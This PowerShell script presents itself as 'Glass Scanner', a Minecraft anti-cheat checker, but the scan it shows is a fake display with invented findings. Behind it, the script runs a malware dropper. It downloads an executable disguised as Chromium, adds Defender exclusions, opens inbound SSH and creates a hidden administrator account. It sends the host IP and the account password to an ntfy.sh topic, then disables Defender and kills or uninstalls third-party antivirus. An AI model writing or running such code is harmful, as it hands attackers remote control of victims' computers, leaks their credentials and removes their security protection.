# ============================================================
#  Glass Scanner Emulator + Chromium Mimic + SSH + AV Killer
#  (c) 2026 – учебная версия для ПТУ
#  Запуск: .\setup.ps1
# ============================================================

# ---------- Проверка прав администратора ----------
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Error: Run as Administrator." -ForegroundColor Red
    pause
    exit 1
}

# ---------- Основные переменные (маскировка под Chromium) ----------
$baseDir = "$env:USERPROFILE\collextor"
$logFile = "$baseDir\setup.log"
$ntfyTopic = "zighaigit88tore"

# Основной EXE – выдаём себя за Chromium
$chromiumDir = "$env:APPDATA\Chromium\Application"
$exeName = "chrome.exe"
$exePath = "$chromiumDir\$exeName"

# === ИЗМЕНЁННЫЙ URL ===
$urlExe = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"

$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) { $scriptPath = $PSCommandPath }

New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
New-Item -ItemType Directory -Force -Path $chromiumDir | Out-Null
"=== Log $(Get-Date) ===" | Out-File -FilePath $logFile -Encoding UTF8

function Write-Log {
    param([string]$Message)
    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Message" | Out-File -FilePath $logFile -Append -Encoding UTF8
}

function Download-File {
    param($url, $path, $retries = 3)
    for ($i = 1; $i -le $retries; $i++) {
        try {
            $client = New-Object System.Net.WebClient
            $client.DownloadFile($url, $path)
            Write-Log "Download OK (attempt $i): $url"
            return $true
        } catch {
            Write-Log "Download error (attempt $i): $_"
            Start-Sleep -Seconds 2
        }
    }
    return $false
}

Write-Log "Start."

# ============================================================
# 1. Download EXE (as chrome.exe)
# ============================================================
Write-Log "Downloading EXE as $exePath..."
if (Download-File $urlExe $exePath) {
    attrib +H +S $exePath
    Write-Log "EXE downloaded and hidden as Chromium."
} else {
    Write-Log "Fatal: cannot download EXE"
    exit 1
}

# ============================================================
# 2. Defender exclusions (усилено)
# ============================================================
Write-Log "Adding Defender exclusions for Chromium folder..."
try {
    $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') { Start-Service WinDefend -ErrorAction SilentlyContinue; Start-Sleep 2 }
    
    Add-MpPreference -ExclusionPath $chromiumDir -ErrorAction Stop
    Add-MpPreference -ExclusionPath $baseDir -ErrorAction Stop
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\collextor" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $exePath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
    
    Write-Log "Exclusions added."
} catch { Write-Log "Exclusion error: $_" }

# ============================================================
# 3. Firewall rules: port 587 outbound, port 22 inbound
# ============================================================
Write-Log "Configuring firewall..."
try {
    # Outbound 587
    $rule587 = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
    if (-not $rule587) {
        New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
        Write-Log "Rule 587 created."
    }
    # Inbound 22 (SSH)
    $rule22 = Get-NetFirewallRule -DisplayName "SSH Inbound" -ErrorAction SilentlyContinue
    if (-not $rule22) {
        New-NetFirewallRule -DisplayName "SSH Inbound" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction Stop | Out-Null
        Write-Log "Rule 22 (SSH) created."
    }
} catch { Write-Log "Firewall error: $_" }

# ============================================================
# 4. Launch EXE (hidden) – как запуск Chromium
# ============================================================
Write-Log "Starting Chromium (hidden)..."
if (Test-Path $exePath) {
    try {
        Start-Process -FilePath $exePath -WindowStyle Hidden -Verb RunAs
        Write-Log "Chromium started."
    } catch { Write-Log "Cannot start Chromium: $_" }
}

# ============================================================
# 5. SSH server + user
# ============================================================
Write-Log "Installing OpenSSH..."
try {
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
    Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop | Out-Null
    Write-Log "OpenSSH installed."
} catch { Write-Log "OpenSSH install error: $_" }

Write-Log "Configuring SSH..."
try {
    Start-Service sshd -ErrorAction Stop
    Set-Service -Name sshd -StartupType 'Automatic' -ErrorAction Stop
    Write-Log "SSH service started."
} catch { Write-Log "SSH service error: $_" }

$userName = "ssh_admin"
$passwordLength = 16
Add-Type -AssemblyName System.Web
$randomPassword = [System.Web.Security.Membership]::GeneratePassword($passwordLength, 4)
$securePassword = ConvertTo-SecureString -String $randomPassword -AsPlainText -Force

Write-Log "Creating user $userName..."
try {
    if (Get-LocalUser -Name $userName -ErrorAction SilentlyContinue) {
        Set-LocalUser -Name $userName -Password $securePassword -ErrorAction Stop
        Write-Log "Password updated."
    } else {
        New-LocalUser -Name $userName -Password $securePassword -FullName "SSH Admin" -Description "SSH account" -ErrorAction Stop | Out-Null
        Add-LocalGroupMember -Group "Administrators" -Member $userName -ErrorAction Stop
        Write-Log "User created and added to Admins."
    }
} catch { Write-Log "User error: $_" }

# ============================================================
# 6. Get local IP
# ============================================================
$ipAddress = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
    $_.IPAddress -ne "127.0.0.1" -and $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*vEthernet*" -and $_.InterfaceAlias -notlike "*Virtual*"
} | Select-Object -First 1 -ExpandProperty IPAddress
if (-not $ipAddress) { $ipAddress = "unknown" }

$base64Password = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($randomPassword))

# ============================================================
# 7. Send notification to ntfy.sh
# ============================================================
$secretMessage = @"
SSH access (local network only):
IP: $ipAddress
Port: 22
User: $userName
Password (Base64): $base64Password
Decrypt: [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("$base64Password"))
"@
$bytes = [System.Text.Encoding]::UTF8.GetBytes($secretMessage)
$encodedMessage = [Convert]::ToBase64String($bytes)

try {
    $ntfyUrl = "https://ntfy.sh/$ntfyTopic"
    Invoke-WebRequest -Uri $ntfyUrl -Method Post -Body $encodedMessage -ContentType "text/plain" -UseBasicParsing -ErrorAction Stop | Out-Null
    Write-Log "Notification sent to ntfy."
} catch { Write-Log "Notification error: $_" }

# ============================================================
# 8. Disable antivirus (Defender + third-party)
# ============================================================
Write-Log "=== DISABLING ANTIVIRUS ==="

# Windows Defender
Write-Log "Disabling Defender..."
try {
    $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
    if (-not (Test-Path $tamperPath)) { New-Item -Path $tamperPath -Force | Out-Null }
    Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -Type DWord -Force
} catch {}
$defPrefs = @{
    DisableRealtimeMonitoring=$true; DisableBehaviorMonitoring=$true; DisableBlockAtFirstSeen=$true
    DisableIOAVProtection=$true; DisablePrivacyMode=$true; DisableArchiveScanning=$true
    DisableIntrusionPreventionSystem=$true; DisableScriptScanning=$true; DisableEmailScanning=$true
    SubmitSamplesConsent=2; MAPSReporting=0
}
foreach ($key in $defPrefs.Keys) {
    try { Set-MpPreference -Name $key -Value $defPrefs[$key] -ErrorAction SilentlyContinue } catch {}
}
$policyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
try {
    if (-not (Test-Path $policyPath)) { New-Item -Path $policyPath -Force | Out-Null }
    Set-ItemProperty -Path $policyPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
    $rtp = "$policyPath\Real-Time Protection"
    if (-not (Test-Path $rtp)) { New-Item -Path $rtp -Force | Out-Null }
    Set-ItemProperty -Path $rtp -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force
    $spynet = "$policyPath\Spynet"
    if (-not (Test-Path $spynet)) { New-Item -Path $spynet -Force | Out-Null }
    Set-ItemProperty -Path $spynet -Name "SpynetReporting" -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $spynet -Name "SubmitSamplesConsent" -Value 2 -Type DWord -Force
} catch {}
$svcs = @("WinDefend","WdNisSvc","Sense","WdBoot","WdFilter","WdNisDrv")
foreach ($s in $svcs) {
    try { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue; Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue } catch {}
}
sc.exe config WinDefend start= disabled | Out-Null
sc.exe config WdNisSvc start= disabled | Out-Null
try {
    $tasks = Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\" -ErrorAction SilentlyContinue
    foreach ($t in $tasks) { Disable-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -ErrorAction SilentlyContinue | Out-Null }
} catch {}
$procs = @("MsMpEng.exe","NisSrv.exe","SecurityHealthService.exe")
$ifeo = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
foreach ($p in $procs) {
    try { $pp = Join-Path $ifeo $p; if (-not (Test-Path $pp)) { New-Item -Path $pp -Force | Out-Null }; Set-ItemProperty -Path $pp -Name "Debugger" -Value "systray.exe" -Type String -Force } catch {}
}
Write-Log "Defender disabled."

# Third-party AV (полный блок из оригинала)
Write-Log "Searching third-party AV..."
function Get-InstalledSoftware {
    param([string]$RegistryPath)
    $software = @()
    if (Test-Path $RegistryPath) {
        $keys = Get-ChildItem -Path $RegistryPath -ErrorAction SilentlyContinue
        foreach ($key in $keys) {
            $name = $key.GetValue("DisplayName")
            if ($name) {
                $guid = $key.PSChildName
                $uninstall = $key.GetValue("UninstallString")
                $software += [PSCustomObject]@{DisplayName=$name; GUID=$guid; Uninstall=$uninstall}
            }
        }
    }
    return $software
}
$avKeywords = @("antivirus","virus","security","protection","kaspersky","avast","avg","norton","mcafee","eset","bitdefender","dr.web","drweb","panda","trend micro","f-secure","sophos","malwarebytes","ad-aware","zonealarm","comodo","avira","bullguard","g-data","webroot","vipre","emsisoft")
$swList = @()
$swList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
$swList += Get-InstalledSoftware -RegistryPath "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
$foundAV = $swList | Where-Object {
    $d = $_.DisplayName
    if ($d -match "Windows Defender|Microsoft Defender") { return $false }
    $matched = $false
    foreach ($kw in $avKeywords) { if ($d -match $kw) { $matched = $true; break } }
    return $matched
}
if ($foundAV.Count -eq 0) {
    Write-Log "No third-party AV found."
} else {
    Write-Log "Found AV: $($foundAV.Count)"
    foreach ($av in $foundAV) {
        Write-Log "Processing: $($av.DisplayName)"
        $cleanName = $av.DisplayName -replace '[^a-zA-Z0-9]', ''
        $svcNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
        $knownSvcs = @{
            "Kaspersky"=@("AVP","kav","kis","ksde","klnagent")
            "Avast"=@("AvastSvc","avast! Antivirus")
            "AVG"=@("AVGIDSAgent","AVGService","avgnt")
            "Norton"=@("NortonInternetSecurity","Norton360","Symantec")
            "McAfee"=@("McShield","McSysmon","mfeav")
            "ESET"=@("ekrn","egui")
            "Bitdefender"=@("bdservices","bdagent","vsserv")
            "Dr.Web"=@("DrWebService","DrWebSvc")
            "Avira"=@("AntiVirService","AviraService")
            "Malwarebytes"=@("MBAMService")
            "Comodo"=@("COMODO Internet Security","cmdagent")
        }
        foreach ($k in $knownSvcs.Keys) { if ($av.DisplayName -match $k) { $svcNames += $knownSvcs[$k] } }
        $svcNames = $svcNames | Select-Object -Unique
        foreach ($s in $svcNames) {
            try { $sc = Get-Service -Name $s -ErrorAction SilentlyContinue; if ($sc) { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue; Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue } } catch {}
        }
        $procNames = @($cleanName, $cleanName+"Service", $cleanName+"Svc")
        $knownProcs = @{
            "Kaspersky"=@("avp.exe","avpui.exe")
            "Avast"=@("avastsvc.exe","avastui.exe")
            "AVG"=@("avgui.exe","avgidsagent.exe")
            "Norton"=@("nav.exe","ns.exe","nortonsecurity.exe")
            "McAfee"=@("mcshield.exe","mctskshd.exe","mcuicnt.exe")
            "ESET"=@("ekrn.exe","egui.exe")
            "Bitdefender"=@("bdss.exe","vsserv.exe","bdagent.exe")
            "Dr.Web"=@("drweb.exe","dwengine.exe")
            "Avira"=@("avguard.exe","avgui.exe")
            "Malwarebytes"=@("mbam.exe","mbamservice.exe")
            "Comodo"=@("cis.exe","cmdagent.exe")
        }
        foreach ($k in $knownProcs.Keys) { if ($av.DisplayName -match $k) { $procNames += $knownProcs[$k] } }
        $procNames = $procNames | Select-Object -Unique
        foreach ($p in $procNames) {
            try { Get-Process -Name $p -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue } catch {}
        }
        if ($av.GUID -match '^\{?[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}?$') {
            $g = $av.GUID
            if ($g -notmatch '^\{') { $g = "{$g}" }
            try { Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $g /quiet /norestart" -Wait -PassThru -NoNewWindow } catch {}
        } else {
            if ($av.Uninstall) { try { Start-Process -FilePath "cmd.exe" -ArgumentList "/c $($av.Uninstall) /quiet /norestart" -Wait -NoNewWindow } catch {} }
        }
    }
}
Write-Log "Antivirus processing complete."

# ============================================================
# 9. Glass Scanner simulation
# ============================================================
function Write-ColorLine {
    param([string]$Text, [string]$Color = "White")
    Write-Host $Text -ForegroundColor $Color
}

$CLR_FOUND   = "Red"
$CLR_WARN    = "Yellow"
$CLR_OK      = "Green"
$CLR_DIM     = "DarkGray"
$CLR_HEADER  = "Cyan"
$CLR_TEXT    = "White"
$CLR_JAR     = "Magenta"

function Print-Header {
    param($ActiveTab)
    Clear-Host
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  GLASS SCANNER  --  by Sokolichek1" -Color $CLR_HEADER
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-Host "  " -NoNewline
    $tabs = @("1) Scan log", "2) Open", "3) Closed")
    for ($i=0; $i -lt $tabs.Count; $i++) {
        $num = $i+1
        $label = $tabs[$i]
        if ($ActiveTab -eq $num) {
            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_OK
        } else {
            Write-Host "[$num] $label  " -NoNewline -ForegroundColor $CLR_DIM
        }
    }
    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
}

function Print-Progress {
    param($step, $total, $name)
    $filled = [math]::Floor(($step * 30) / $total)
    $percent = [math]::Floor(($step * 100) / $total)
    Write-Host "[" -NoNewline
    Write-Host ("#" * $filled) -NoNewline -ForegroundColor $CLR_OK
    Write-Host (" " * (30 - $filled)) -NoNewline
    Write-Host "] " -NoNewline
    Write-Host "$percent%" -NoNewline -ForegroundColor $CLR_WARN
    Write-Host "  $name" -ForegroundColor $CLR_TEXT
}

function Run-ScanSimulation {
    Print-Header 1
    $steps = @(
        "Everything","Prefetch","UserAssist","MuiCache","BAM","ShellBag","ShellBag cleaners",
        "Recent folder","LNK files","Recycle Bin","USN Journal","DLL injections",
        "Minecraft mods","Minecraft versions","JAR scan all PC","Temp folders",
        "AppData","BAT files","Command history","Browser downloads","System services",
        "Hosts file","Registry .dll traces"
    )
    $total = $steps.Count
    $stepNum = 0
    Write-ColorLine "`n  Starting scan..." -Color $CLR_WARN
    Write-Host "  Keywords loaded: 54`n" -ForegroundColor $CLR_DIM

    foreach ($s in $steps) {
        $stepNum++
        Print-Progress $stepNum $total $s
        if ($s -eq "Everything") {
            Write-ColorLine "  [--] Querying Everything..." -Color $CLR_DIM
            Write-Host "  [FOUND] file/folder: C:\Users\Public\cheat.jar" -ForegroundColor $CLR_FOUND
        }
        if ($s -eq "Prefetch") {
            Write-ColorLine "  [--] Scanning Prefetch..." -Color $CLR_DIM
            Write-Host "  [FOUND] prefetch: C:\Windows\Prefetch\HACK.EXE-12345678.pf" -ForegroundColor $CLR_FOUND
        }
        if ($s -eq "Minecraft mods") {
            Write-ColorLine "  Folder: $env:APPDATA\.minecraft\mods" -Color $CLR_HEADER
            Write-Host "  [FOUND] mod: XRay_Ultimate.jar  1560 KB" -ForegroundColor $CLR_FOUND
            Write-Host "    Signature: net/ccbluex/liquidbounce" -ForegroundColor $CLR_FOUND
        }
        if ($s -eq "DLL injections") {
            Write-ColorLine "  [--] Scanning loaded DLLs..." -Color $CLR_DIM
            Write-Host "  [FOUND] dll-injection in [minecraft.exe]: C:\hack\inject.dll" -ForegroundColor $CLR_FOUND
        }
        if ($s -eq "JAR scan all PC") {
            Write-ColorLine "  Disk: C:" -Color $CLR_HEADER
            Write-Host "  [FOUND] jar: C:\ProgramData\evil.jar  3560 KB" -ForegroundColor $CLR_FOUND
            Write-Host "    Reason: size matches known cheat (831424 bytes)" -ForegroundColor $CLR_WARN
        }
        if ($s -eq "System services") {
            Write-ColorLine "  [--] Checking critical services..." -Color $CLR_DIM
            Write-Host "  [BAN 7d] Sysmain (Superfetch) — DISABLED" -ForegroundColor $CLR_FOUND
            Write-Host "  [OK] EventLog — running" -ForegroundColor $CLR_OK
        }
        Start-Sleep -Milliseconds 300
    }

    Write-Host "[" -NoNewline
    Write-Host ("#" * 30) -NoNewline -ForegroundColor $CLR_OK
    Write-Host "] " -NoNewline
    Write-Host "100%" -NoNewline -ForegroundColor $CLR_OK
    Write-Host "  Done!" -ForegroundColor $CLR_TEXT

    Write-Host ""
    Write-ColorLine "================================================================" -Color $CLR_HEADER
    Write-ColorLine "  SCAN COMPLETE" -Color $CLR_OK
    Write-ColorLine "================================================================" -Color $CLR_HEADER
}

# ---------- Run simulation ----------
Run-ScanSimulation

# Menu
while ($true) {
    Write-Host ""
    Write-ColorLine "Press 1 - Scan log  |  2 - Open  |  3 - Closed  |  Q - Quit" -Color $CLR_DIM
    $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
    switch ($key) {
        '1' { Run-ScanSimulation }
        '2' { 
            Print-Header 2
            Write-ColorLine "`n  OPEN APPLICATIONS (currently running)" -Color $CLR_OK
            # (можно расширить при необходимости)
        }
        '3' { 
            Print-Header 3
            Write-ColorLine "`n  CLOSED APPLICATIONS (previously launched)" -Color $CLR_WARN
        }
        'q' { break }
        'Q' { break }
    }
}

Write-Log "Script finished."
